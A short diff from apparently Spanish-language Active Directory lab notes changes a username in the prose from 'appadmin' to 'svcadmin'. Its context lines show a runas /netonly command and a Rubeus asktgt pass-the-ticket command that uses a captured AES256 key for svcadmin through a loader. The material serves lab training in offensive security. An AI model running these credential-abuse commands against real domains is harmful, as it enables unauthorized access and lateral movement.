@@ -782,7 +782,7 @@ Primero deberemos de ejecutar un proceso con privilegios de Domain Admin, para e
 runas /user:dcorp\student97 /netonly cmd
 ```
 
-Y extraeremos los secrets usando *SafetyKatz*, tendremos que pasar el usuario y el hash de *appadmin*
+Y extraeremos los secrets usando *SafetyKatz*, tendremos que pasar el usuario y el hash de *svcadmin*
 ```shell
 [newShell as student97 privileges]
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
